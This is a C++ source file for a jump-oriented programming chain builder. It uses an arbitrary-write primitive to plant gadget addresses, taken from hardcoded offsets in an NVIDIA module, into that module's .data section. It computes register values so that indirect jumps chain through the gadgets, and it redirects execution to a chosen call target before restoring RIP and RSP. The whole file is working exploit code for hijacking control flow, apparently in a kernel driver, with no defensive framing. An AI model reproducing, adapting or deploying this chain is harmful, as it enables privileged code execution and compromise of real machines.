#include "jopmanager.h"

JOPManager::JOPManager()
    : allocPtr(SCRATCH_ALLOC_START), nvidiaBase(0), scratchBase(0), g1Off(0), rax(0), rsi(0), rdx(0), rdiForJmp(0)
{}

void JOPManager::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn) {
    writeFn = fn;
}

void JOPManager::SetNvidiaBase(UINT64 base) {
    nvidiaBase = base;
}

void JOPManager::SetScratchBase(UINT64 base) {
    scratchBase = base;
    DbgLog("[JOPManager] scratchBase=0x%llX\n", scratchBase);
}

void JOPManager::AddSlot(const char* name, UINT64 scratchOff, UINT64 value) {
    // 1.7MB free in .data — cap at 1.6MB to stay safe
    if (scratchOff + sizeof(UINT64) > 0x19A000) {
        DbgLog("[JOPManager] OVERFLOW: '%s' at scratch+0x%llX\n", name, scratchOff);
        return;
    }
    slots.push_back({ name, scratchBase + scratchOff, value });
}

UINT64 JOPManager::Alloc(const char* name, UINT64 value) {
    UINT64 off = allocPtr;
    AddSlot(name, off, value);
    allocPtr += sizeof(UINT64);
    return scratchBase + off;
}

void JOPManager::Build(UINT64 g1Off_, UINT64 g2Off, UINT64 g3Off, UINT64 g4Off) {
    slots.clear();
    allocPtr = SCRATCH_ALLOC_START;
    g1Off = g1Off_;

    if (!scratchBase) {
        DbgLog("[JOPManager::Build] FAIL: scratchBase not set\n");
        return;
    }

    UINT64 g2 = nvidiaBase + g2Off;
    UINT64 g3 = nvidiaBase + g3Off;
    UINT64 g4 = nvidiaBase + g4Off;

    UINT64 pop_rcx_rdi = nvidiaBase + 0x000636d07; // pop rcx ; jmp [rdi*9+0xDBB9]  (skip and eax)
    UINT64 pop_rdi = nvidiaBase + 0x0003fce5;      // pop rdi ; test al,0xFD ; jmp [rsi-0x77]
    UINT64 pop_rcx = nvidiaBase + 0x000ae8360;     // pop rcx ; jmp [rsi-0x7F]
    UINT64 pop_rbx = nvidiaBase + 0x000da4fd2;     // pop rbx ; jmp [rsi+0x44]

    // Compute rdi value for [rdi*9+0xDBB9] jump to land in scratch
    UINT64 target_rdi_jmp = scratchBase + SCRATCH_RDI_JMP;
    // Solve: rdi * 9 + 0xDBB9 ≡ target (mod 2^64) using modular inverse of 9
    // Compute 9^(-1) mod 2^64 via Newton-Raphson (5 doublings = 64 bits of precision)
    UINT64 x = 9;
    x *= 2 - 9 * x;
    x *= 2 - 9 * x;
    x *= 2 - 9 * x;
    x *= 2 - 9 * x;
    x *= 2 - 9 * x;
    // x is now 9^(-1) mod 2^64

    rdiForJmp = (target_rdi_jmp - 0xDBB9) * x;
    DbgLog("[JOP] rdi=0x%llX → verify [rdi*9+0xDBB9]=0x%llX (expect 0x%llX)\n",
        rdiForJmp, rdiForJmp * 9 + 0xDBB9, target_rdi_jmp);

    // Chain: pop_rcx_rdi (pop1, uses rdi) → pop_rdi (pop2) → pop_rcx (pop3) → pop_rbx (pop4) → gadget2
    AddSlot("rsi_fwd  [rsi+0x66]", SCRATCH_RSI_FWD,  pop_rcx_rdi); // entry after function returns
    AddSlot("rsi_0x44 [rsi+0x44]", SCRATCH_RSI_0x44, g2);          // pop_rbx → gadget2
    AddSlot("rsi_bck  [rsi-0x39]", SCRATCH_RSI_BCK,  g3);          // gadget2 → gadget3
    AddSlot("rdi_jmp [rdi*9+0xDBB9]", SCRATCH_RDI_JMP, pop_rdi);   // pop_rcx_rdi chains here

    // Negative-offset slots — use absolute addresses directly (below scratchBase, still .data)
    slots.push_back({ "rsi_n77 [rsi-0x77]", scratchBase - 0x38, pop_rcx }); // pop_rdi → pop_rcx
    slots.push_back({ "rsi_n7F [rsi-0x7F]", scratchBase - 0x40, pop_rbx }); // pop_rcx → pop_rbx
    rsi = scratchBase + SCRATCH_RSI_FWD - 0x66;
    DbgLog("[JOP] rsi=0x%llX  [rsi+0x66]=0x%llX  [rsi-0x39]=0x%llX\n",
        rsi, rsi + 0x66, rsi - 0x39);

    // rax slot
    AddSlot("rax_slot [rax-0x35C17]", SCRATCH_RAX, g2);
    rax = scratchBase + SCRATCH_RAX + 0x35C17;
    DbgLog("[JOP] rax=0x%llX  [rax-0x35C17]=0x%llX\n", rax, rax - 0x35C17);

    // rdx anchor: gadget3 reads new_rax from [rdx+0x1B0]
    // We put the new_rax value at SCRATCH_NEW_RAX, so:
    //   rdx + 0x1B0 = scratchBase + SCRATCH_NEW_RAX
    //   rdx = scratchBase + SCRATCH_NEW_RAX - 0x1B0
    rdx = scratchBase + SCRATCH_NEW_RAX - 0x1B0;
    UINT64 newRax = scratchBase + SCRATCH_NEW_RAX;
    AddSlot("rdx_1B0 [rdx+0x1B0]", SCRATCH_NEW_RAX, newRax);
    DbgLog("[JOP] rdx=0x%llX  [rdx+0x1B0]=0x%llX (newRax)\n", rdx, newRax);
    DbgLog("[JOP] gadget3 side-writes: [rdx+0x3E0]=0x%llX  [rdx+0x3E8]=0x%llX (scratch, harmless)\n",
        rdx + 0x3E0, rdx + 0x3E8);

    // gadget3 continuation: [newRax+0x1C0] -> g4
    AddSlot("g3_cont [newRax+0x1C0]", SCRATCH_G3_CONT, g4);

    // gadget4 continuation: [newRax+0x28] -> rop pivot
    AddSlot("g4_cont [newRax+0x28]", SCRATCH_G4_CONT, 0);

    // pop rdx scratch: RSP points here, gadget2 pops rdx from [rsp]
    // rdx = scratchBase + SCRATCH_NEW_RAX - 0x1B0 (computed above)
    AddSlot("pop_rdx [rsp]", SCRATCH_POP_RDX, rdx);

    DbgLog("[JOP] Build complete - %zu slots, scratch base=0x%llX\n",
        slots.size(), scratchBase);
}

void JOPManager::SetOriginalRsp(UINT64 originalRsp) {
    if (!scratchBase) { DbgLog("[JOP::SetOriginalRsp] FAIL: scratchBase not set\n"); return; }
    if (!writeFn)     { DbgLog("[JOP::SetOriginalRsp] FAIL: no write primitive\n"); return; }
    UINT64 slot = scratchBase + SCRATCH_STACK_TOP;
    DbgLog("[JOP::SetOriginalRsp] [STACK_TOP=0x%llX] = originalRsp=0x%llX\n", slot, originalRsp);
    writeFn(slot, originalRsp);
}

void JOPManager::SetCallTarget(UINT64 addr) {
    if (!scratchBase) { DbgLog("[JOP::SetCallTarget] FAIL: scratchBase not set\n"); return; }
    if (!writeFn)     { DbgLog("[JOP::SetCallTarget] FAIL: no write primitive\n"); return; }
    UINT64 slot = scratchBase + SCRATCH_RAX;
    DbgLog("[JOP::SetCallTarget] [rax-0x35C17]=0x%llX -> 0x%llX\n", slot, addr);
    writeFn(slot, addr);
    for (auto& s : slots) { if (s.addr == slot) { s.value = addr; return; } }
}

void JOPManager::SetRestoreRip(UINT64 addr) {
    if (!scratchBase) { DbgLog("[JOP::SetRestoreRip] FAIL: scratchBase not set\n"); return; }
    if (!writeFn)     { DbgLog("[JOP::SetRestoreRip] FAIL: no write primitive\n"); return; }
    UINT64 slot = scratchBase + SCRATCH_G4_CONT;
    DbgLog("[JOP::SetRestoreRip] [newRax+0x28]=0x%llX -> 0x%llX\n", slot, addr);
    writeFn(slot, addr);
    for (auto& s : slots) { if (s.addr == slot) { s.value = addr; return; } }
}

void JOPManager::Commit() {
    if (!scratchBase) { DbgLog("[JOP::Commit] FAIL: scratchBase not set\n"); return; }
    if (!writeFn)     { DbgLog("[JOP::Commit] FAIL: no write primitive\n"); return; }
    for (const auto& s : slots) {
        DbgLog("[JOP::Commit] %-35s  addr=0x%llX  val=0x%llX\n",
            s.name, s.addr, s.value);
        writeFn(s.addr, s.value);
    }
    DbgLog("[JOP::Commit] Done — %zu slots written\n", slots.size());
}

void JOPManager::PrintLayout() const {
    DbgLog("[JOP Layout] scratchBase=0x%llX  (%zu slots)\n", scratchBase, slots.size());
    for (const auto& s : slots)
        DbgLog("  %-35s  0x%llX  =  0x%llX\n", s.name, s.addr, s.value);
    DbgLog("  rax = 0x%llX\n  rsi = 0x%llX\n  rdx = 0x%llX\n", rax, rsi, rdx);
}
